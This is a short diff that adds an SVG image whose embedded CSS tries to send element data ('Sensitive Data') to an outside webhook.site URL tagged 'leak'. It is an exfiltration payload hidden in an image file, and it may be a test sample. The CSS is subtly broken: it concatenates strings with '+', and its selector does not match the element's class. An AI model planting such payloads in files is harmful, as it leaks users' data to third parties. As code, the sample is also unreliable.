@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .secret-data { background: url('https://webhook.site/1f4b29d0-8998-44fb-a1d7-d5dce633ef5a?leak?data='+attr(class)); }
+  </style>
+  <text class="secret-info">Sensitive Data</text>
+</svg>
